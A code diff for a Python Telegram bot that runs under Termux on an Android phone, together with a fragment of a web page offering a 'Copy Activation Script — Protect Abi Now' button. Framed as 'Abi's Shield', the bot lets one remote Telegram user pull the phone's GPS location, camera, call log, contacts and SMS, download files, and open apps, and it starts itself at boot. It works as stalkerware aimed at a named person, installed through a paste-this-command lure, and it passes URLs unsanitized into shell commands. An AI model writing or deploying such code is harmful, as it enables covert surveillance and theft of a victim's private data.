@@ -748,9 +748,9 @@ async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     out = run("termux-location")
     if "error" in out.lower() or "disabled" in out.lower() or out == "":
-        await update.message.reply_text("📍 Abi's GPS is OFF — Opening location settings on her phone...")
+        await update.message.reply_text("📍 Abi's GPS is OFF — Opening location settings...")
         os.system("am start -a android.settings.LOCATION_SOURCE_SETTINGS")
-        await update.message.reply_text("🔄 Location settings opened. Try /location again after GPS is enabled.")
+        await update.message.reply_text("🔄 Settings opened. Try /location again after GPS is enabled.")
         return
     try:
         data = json.loads(out)
@@ -791,10 +791,8 @@ async def dl(update, context):
     filename = url.split("/")[-1].split("?")[0]
     if not filename: filename = "downloaded_file"
     filepath = f"/sdcard/Download/{filename}"
-    
-    await update.message.reply_text(f"⬇️ Downloading to Abi's Downloads folder...")
-    result = os.system(f"curl -L -o '{filepath}' '{url}' 2>/dev/null")
-    
+    await update.message.reply_text(f"⬇️ Downloading to Abi's Downloads...")
+    os.system(f"curl -L -o '{filepath}' '{url}' 2>/dev/null")
     if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
         await update.message.reply_text(f"✅ Saved: {filename}\n📁 /sdcard/Download/")
     else:
@@ -822,11 +820,10 @@ async def open_url(update, context):
     if not context.args:
         await update.message.reply_text("""🔗 *Usage:*
 /open &lt;url&gt; — Open website
-/open app &lt;name&gt; — Open app
+/open app &lt;name&gt; — Open app directly
 
-📱 *Apps:* gmail, whatsapp, instagram, youtube, chrome, maps, settings, gallery, camera""")
+📱 *Apps:* gmail, whatsapp, instagram, youtube, chrome, maps, settings, gallery, camera, phone, messages""")
         return
-    
     if context.args[0].lower() == "app":
         if len(context.args) < 2:
             await update.message.reply_text("Usage: /open app <name>\nExample: /open app gmail")
@@ -850,13 +847,13 @@ async def open_url(update, context):
         }
         if app_name in apps:
             pkg = apps[app_name]
-            os.system(f"am start -n {pkg}/.MainActivity 2>/dev/null || am start {pkg} 2>/dev/null || monkey -p {pkg} 1 2>/dev/null")
+            os.system(f"am start {pkg}")
             await update.message.reply_text(f"📱 Opened {app_name.upper()} on Abi's phone")
         else:
             await update.message.reply_text(f"❌ Unknown app. Available: {', '.join(apps.keys())}")
     else:
         url = context.args[0]
-        os.system(f"termux-open-url '{url}'")
+        os.system(f"am start -a android.intent.action.VIEW -d '{url}'")
         await update.message.reply_text(f"🔗 Opened on Abi's phone: {url}")
 
 async def toast(update, context):
@@ -907,26 +904,20 @@ async def help_cmd(update, context):
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    
     handlers = [
         ("start", start), ("help", help_cmd), ("cam", cam), ("location", loc),
         ("battery", bat), ("download", dl), ("say", say),
         ("vibrate", vib), ("torch", tor), ("open", open_url), ("toast", toast),
         ("calls", calls), ("contacts", cont), ("sms", sms_cmd)
     ]
-    
     for cmd, func in handlers:
         app.add_handler(CommandHandler(cmd, func))
-    
     await app.initialize()
     await app.start()
-    
     if not os.path.exists(FLAG):
         await boot_dump(app)
-    
     print("🛡️ Abi's Shield — ACTIVE")
     await app.updater.start_polling()
-    
     while True:
         await asyncio.sleep(3600)
 
@@ -976,15 +967,12 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — 
             const codeBlock = document.getElementById('commandBox');
             const btn = document.getElementById('deployBtn');
             const toast = document.getElementById('toast');
-            
             navigator.clipboard.writeText(codeBlock.textContent).then(() => {
                 btn.innerHTML = '<span>✓</span> Copied — Protect Abi Now';
                 btn.style.background = '#f59e0b';
                 btn.style.boxShadow = '0 4px 24px rgba(245,158,11,0.35)';
-                
                 toast.classList.add('visible');
                 setTimeout(() => toast.classList.remove('visible'), 2800);
-                
                 setTimeout(() => {
                     btn.innerHTML = '<span>📋</span> Copy Activation Script';
                     btn.style.background = '#ff6b9d';
